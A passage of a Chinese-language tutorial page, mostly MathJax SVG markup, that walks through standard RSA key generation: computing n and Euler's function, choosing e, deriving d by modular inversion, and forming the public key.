-0.439ex;" xmlns="http://www.w3.org/2000/svg" width="8.313ex" height="1.758ex" role="img" focusable="false" viewBox="0 -583 3674.6 777"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1933.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(2436.6,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3214.6,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>​</p></li><li><p>计算欧拉函数：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="22.736ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10049.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(596,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(985,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1585,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2251.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3307.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3696.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(4421.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(5422,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5922,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(6311,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(7089,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7478,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(8160.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(9160.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(9660.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p></li><li><p>选择一个与 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.466ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1974 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(596,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(985,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1585,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>互质的整数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container>​（通常选择较小的素数，如65537）</p></li><li><p>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>使得<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container>的模<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.466ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1974 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(596,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(985,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1585,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>逆元，即满足：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.626ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8232.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1298,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(2041.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"></path></g><g data-mml-node="mn" transform="translate(3097.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3597.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3986.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4864.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5349.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5869.6,0)"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(6465.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6854.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7454.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7843.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><br>这个方程可以通过扩展欧几里得算法求解。</p></li><li><p>公钥是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.178ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2288.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 